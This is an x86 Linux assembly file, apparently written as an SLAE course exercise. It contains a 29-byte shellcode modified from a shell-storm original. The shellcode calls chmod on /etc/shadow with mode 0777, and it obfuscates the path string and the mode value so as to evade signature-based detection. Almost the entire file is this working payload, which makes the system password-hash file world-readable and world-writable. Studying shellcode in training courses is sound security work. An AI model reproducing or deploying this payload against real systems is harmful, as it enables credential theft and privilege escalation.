; Modified 29 bytes chmod("/etc/shadow", 0777) shellcode by fbcsec
; Original by Magnefikko
; Original: http://shell-storm.org/shellcode/files/shellcode-593.php
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:

push 0x0f
pop eax                 ; PUSH POP 0x0000000f into EAX
cdq                     ; Zero EDX
push edx                ; Push 0x00000000 to the stack

mov edx, 0x665e5350     ; Move an 'encoded' 'adow' string to the stack.
add edx, 0x11111111     ; decode edx
push edx                ; push 'adow', reversed, to the stack.
mov cx, 0xfee8          ; Move into CX an encoded octal '777' (0x01ff)
push 0x68732f63         ; push 'c/sh', reversed, to the stack

not ch                  ; decode CH
add cl, 0x17            ; decode CL
push 0x74652f2f         ; push '//et', reversed, to the stack

push esp                ; PUSH POP the stack pointer (which is a pointer to the '/etc/shadow' string into EBX.
pop ebx

int 0x80                ; fire chmod(2) syscall
